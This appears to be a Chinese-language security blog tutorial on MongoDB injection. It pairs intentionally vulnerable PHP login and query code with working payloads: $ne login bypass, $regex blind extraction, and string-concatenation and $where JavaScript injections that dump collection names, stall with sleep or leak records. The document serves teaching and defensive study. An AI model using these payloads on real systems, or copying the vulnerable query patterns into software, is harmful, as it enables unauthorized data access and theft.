<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>MongoDB 注入 - ConsT27's Blog</title>
    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "MongoDB \u6ce8\u5165", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_1" },
              {title: "Nosql", url: "#nosql" },
              {title: "MongoDB", url: "#mongodb_1" },
              {title: "MongoDB \u6ce8\u5165", url: "#mongodb_2" },
              {title: "ref", url: "#ref" },
          ]},
        ];

    </script>
    <script src="../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Mongodb/Mongodb/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Mongodb/Mongodb/" class="btn btn-xs btn-link">
        Mongodb
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Apache%20superset/Apache%20superset/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Apache%20superset/Apache%20superset/" class="btn btn-xs btn-link">
        Apache superset
      </a>
    </div>
    
  </div>

    

    <h1 id="mongodb">MongoDB 注入</h1>
<h2 id="_1">目录</h2>
<ul>
<li><a href="#Nosql">Nosql</a></li>
<li><a href="#MongoDB">MongoDB</a><ul>
<li><a href="#基本概念">基本概念</a></li>
<li><a href="#数据库操作">数据库操作</a></li>
<li><a href="#集合操作">集合操作</a></li>
<li><a href="#文档操作">文档操作</a></li>
</ul>
</li>
<li><a href="#MongoDB-注入">MongoDB 注入</a><ul>
<li><a href="#MongoDB函数注入">MongoDB函数注入</a></li>
<li><a href="#字符串拼接">字符串拼接</a></li>
</ul>
</li>
<li><a href="#ref">ref</a></li>
</ul>
<h2 id="nosql">Nosql</h2>
<p>NoSQL(NoSQL = Not Only SQL )，意即"不仅仅是SQL"。</p>
<p>传统数据库如mysql就是关系型数据库，而如MongoDB就是非关系型数据库，也被叫做NosqL</p>
<h2 id="mongodb_1">MongoDB</h2>
<p>MongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p>
<p><img alt="" src="../image/image_LnAtiXZ1qi.png" /></p>
<h3 id="_2">基本概念</h3>
<p>与SQL对照</p>
<table>
<thead>
<tr>
<th>SQL术语/概念</th>
<th>MongoDB术语/概念</th>
<th>解释/说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>database</td>
<td>database</td>
<td>数据库</td>
</tr>
<tr>
<td>table</td>
<td>collection</td>
<td>数据库表/集合</td>
</tr>
<tr>
<td>row</td>
<td>document</td>
<td>数据记录行/文档</td>
</tr>
<tr>
<td>column</td>
<td>field</td>
<td>数据字段/域</td>
</tr>
<tr>
<td>index</td>
<td>index</td>
<td>索引</td>
</tr>
<tr>
<td>table joins</td>
<td></td>
<td>表连接,MongoDB不支持</td>
</tr>
<tr>
<td>primary key</td>
<td>primary key</td>
<td>主键,MongoDB自动将_id字段设置为主键</td>
</tr>
</tbody>
</table>
<p><img alt="" src="../image/image_Bquxoh8z07.png" /></p>
<h3 id="_3">数据库操作</h3>
<pre><code class="language-纯文本">db 查看当前数据库
show dbs 查看所有数据库
use db_name 使用某数据库

创建数据库
use new_db_name  如果数据库不存在，则创建数据库，否则切换到指定数据库
db.new_db_name.insert({&quot;xxx&quot;:&quot;xxx}) 要显示此新数据库，我们需要向new_db_name 数据库插入一些数据。

删除数据库
db.dropDatabase()

</code></pre>
<h3 id="_4">集合操作</h3>
<pre><code class="language-纯文本">db.createCollection(name,option)  创建集合，第二个参数是附加参数
db.collection_name.drop() 删除集合
</code></pre>
<h3 id="_5">文档操作</h3>
<pre><code class="language-纯文本">插入文档
db.COLLECTION_NAME.insert({&quot;xx&quot;:&quot;x&quot;})
或
db.COLLECTION_NAME.save({&quot;xx&quot;:&quot;x&quot;})

查询文档
db.collection.find(query, projection)
query ：可选，使用查询操作符指定查询条件
projection ：可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）

更新文档
db.collection.update(
   &lt;query&gt;,
   &lt;update&gt;,
   {
     upsert: &lt;boolean&gt;,
     multi: &lt;boolean&gt;,
     writeConcern: &lt;document&gt;
   }
)
query : update的查询条件，类似sql update查询内where后面的。
update : update的对象和一些更新的操作符（如$,$inc...）等，也可以理解为sql update查询内set后面的
upsert : 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。
multi : 可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。
writeConcern :可选，抛出异常的级别。

删除文档
db.collection.remove(
   &lt;query&gt;,
   &lt;justOne&gt;
)
query :（可选）删除的文档的条件。
justOne : （可选）如果设为 true 或 1，则只删除一个文档，如果不设置该参数，或使用默认值 false，则删除所有匹配条件的文档。

</code></pre>
<h2 id="mongodb_2">MongoDB 注入</h2>
<p>所用mongodb驱动</p>
<p>注入根据代码咋写大概有两种情况
一个是代码里直接写死数据库操作的字符串然后执行</p>
<pre><code class="language-纯文本">#!php
&lt;?php

$mongo = new mongoclient();

$db = $mongo-&gt;myinfo; //选择数据库

$query = &quot;db.table.save({'newsid':1})&quot;;    //增

$query = &quot;db.table.find({'newsid':1})&quot;;    //查

$query = &quot;db.table.remove({'newsid':1})&quot;;    //减

$query = &quot;db.table.update({'newsid':1},{'newsid',2})&quot;;    改

$result = $db-&gt;execute($query);

</code></pre>
<p>一个是使用MongoDB提供的方法进行数据库操作</p>
<pre><code class="language-纯文本">#!php
&lt;?php

$mongo = new mongoclient();

$db = $mongo-&gt;myinfo; //选择数据库

$coll = $db-&gt;test; //选择集合

$coll-&gt;save();    //增

$coll-&gt;find();    //查

$coll-&gt;remove();    //减

$coll-&gt;update();    //改
</code></pre>
<h3 id="mongodb_3">MongoDB函数注入</h3>
<p>数组绑定注入</p>
<pre><code class="language-纯文本">#!php
&lt;?php
$mongo = new mongoclient();
$db = $mongo-&gt;myinfo; //选择数据库
$coll = $db-&gt;test; //选择集合
$username = $_GET['username'];
$password = $_GET['password'];
$data = array(
        'username'=&gt;$username,
        'password'=&gt;$password
        );
$data = $coll-&gt;find($data);
$count = $data-&gt;count();
if ($count&gt;0) {
    foreach ($data as $user) {
        echo 'username:'.$user['username'].&quot;&lt;/br&gt;&quot;;
        echo 'password:'.$user['password'].&quot;&lt;/br&gt;&quot;;
    }
}
else{
    echo '未找到';
}
?&gt;
</code></pre>
<p>正常业务逻辑</p>
<pre><code class="language-纯文本">url?username=tom&amp;password=123456
</code></pre>
<p>注入</p>
<pre><code class="language-纯文本">url?username[$ne]=xxxx&amp;password[$ne]=xxxx
</code></pre>
<p>这个参数发过去后，多维数组解析后，代码内部就是这个情况</p>
<pre><code class="language-纯文本">$data = array(
        'username'=&gt;array('$ne'=&gt;&quot;xxxx&quot;),
        'password'=&gt;array('$ne'=&gt;&quot;xxxx&quot;)
        );

执行的数据库语句就是 db.test.find({username:{'$ne':'xxxx'},password:{'$ne':'xxxx'}});
就是查询test集合中的 username不为xxxx，password不为xxxx的结果。换而言之就是查询test集合中所有数据
相当于mysql：select * from test where username!='test' and password!='test';
</code></pre>
<p>盲注：利用正则</p>
<pre><code class="language-纯文本">#!php
&lt;?php
$mongo = new mongoclient();
$db = $mongo-&gt;myinfo; //选择数据库
$coll = $db-&gt;test; //选择集合
$lock = $_POST['lock'];
$key = $_POST['key'];
if (is_array($lock)) {
    $data = array(
        'lock'=&gt;$lock);
    $data = $coll-&gt;find($data);
    if ($data-&gt;count()&gt;0) {
        echo 'the lock is right,but wrong key';
    }else{
        echo 'lock is wrong';
    }
}else{
    if ($lock == 'aabbccdd'&amp;&amp;$key=='aabbccdd') {
        echo 'Your flag is xxxxxxx';
    }else{
        echo 'lock is wrong';
    }
}
?&gt;

payload
key=1&amp;lock[$regex]=^a
key=1&amp;lock[$regex]=^b
key=1&amp;lock[$regex]=^c
.....
相当于：
db.test.find({lock:{'$regex':'^a'}});
db.test.find({lock:{'$regex':'^b'}}); 
db.test.find({lock:{'$regex':'^c'}}); 
db.test.find({lock:{'$regex':'^ca'}}); 
…… …… 
db.test.find({lock:{'$regex':'^aabbccdd'}});

</code></pre>
<h3 id="_6">字符串拼接</h3>
<pre><code class="language-纯文本">#!php
&lt;?php
$username = $_GET['username'];
$password = $_GET['password'];
$query = &quot;var data = db.test.findOne({username:'$username',password:'$password'});return data;&quot;;
//$query = &quot;return db.test.findOne();&quot;;
//echo $query;
$mongo = new mongoclient();
$db = $mongo-&gt;myinfo;
$data = $db-&gt;execute($query);
if ($data['ok'] == 1) {
    if ($data['retval']!=NULL) {
        echo 'username:'.$data['retval']['username'].&quot;&lt;/br&gt;&quot;;
        echo 'password:'.$data['retval']['password'].&quot;&lt;/br&gt;&quot;;
    }else{
        echo '未找到';
    }
}else{
    echo $data['errmsg'];
}
?&gt;
</code></pre>
<p>本质上攻击手法还是字符拼接然后加注释符</p>
<p><a href="http://127.0.0.1/1.php?username=test" title="http://127.0.0.1/1.php?username=test">http://127.0.0.1/1.php?username=test</a>'});return {username:tojson(db.getCollectionNames()),password:2};//\&amp;password=test</p>
<p><img alt="" src="../image/image_ui5_Xc4GZI.png" /></p>
<p>高版本好像不能加注释符了，那就使用闭合的方法即可。
这个payload是盲注</p>
<p><a href="http://127.0.0.1/1.php?username=test" title="http://127.0.0.1/1.php?username=test">http://127.0.0.1/1.php?username=test</a>'});if (db.version() &gt; "0") { sleep(10000); exit; }var b=({a:'1\&amp;password=test</p>
<p>where注入 demo</p>
<p>在Mongdb中可以使用\$where操作符,相当于sql语句中的where限制语句,mongodb中的\$where操作符常常引入一个js的函数来作为限制条件，当js函数中的字符串存在未过滤的用户输入时，注入就产生了。</p>
<pre><code class="language-纯文本">#!php
&lt;?php
$mongo = new mongoclient();
$db = $mongo-&gt;myinfo; //选择数据库
$coll = $db-&gt;news; //选择集合
$news = $_GET['news'];
$function = &quot;function() {if(this.news == '$news') return true}&quot;;
echo $function;
$result = $coll-&gt;find(array('$where'=&gt;$function));
if ($result-&gt;count()&gt;0) {
    echo '该新闻存在';
}else{
    echo '该新闻不存在';
}
?&gt;
</code></pre>
<p>本质上就相当于</p>
<p>select * from news where news='\$news'，那就字符串拼接就行了，和mysql注入差不多</p>
<p>盲注payload</p>
<p><a href="http://127.0.0.1/3.php?news=test'&amp;\&amp;db.getCollectionNames().length&gt;0&amp;&amp;'1'=='1" title="http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames().length&gt;0%26%26'1'=='1">http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames().length&gt;0%26%26'1'=='1</a></p>
<p><a href="http://127.0.0.1/3.php?news=test'&amp;\&amp;db.getCollectionNames()[0][0]=='m'&amp;&amp;'1'=='1" title="http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames()[0][0]=='m'%26%26'1'=='1">http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames()[0][0]=='m'%26%26'1'=='1</a></p>
<p><a href="http://127.0.0.1/3.php?news=test'&amp;\&amp;tojson(db.user.find()[0])[0]=='" title="http://127.0.0.1/3.php?news=test'%26%26tojson(db.user.find()[0])[0]=='">http://127.0.0.1/3.php?news=test'%26%26tojson(db.user.find()[0])[0]=='</a>{'%26%26'1'=='1</p>
<p>因为db.user.find()返回的不是一个字符串，无法取出字符进行比较，我们可以将它转化成一个json字符串，就可以比较了。 道理讲明白了，剩下的都是体力活，用python或者php写下小脚本就能实现自动化。</p>
<h2 id="ref">ref</h2>
<p><a href="https://wooyun.js.org/drops/Mongodb注入攻击.html" title="https://wooyun.js.org/drops/Mongodb注入攻击.html">https://wooyun.js.org/drops/Mongodb注入攻击.html</a></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Mongodb/Mongodb/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Mongodb/Mongodb/" class="btn btn-xs btn-link">
        Mongodb
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Apache%20superset/Apache%20superset/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Apache%20superset/Apache%20superset/" class="btn btn-xs btn-link">
        Apache superset
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>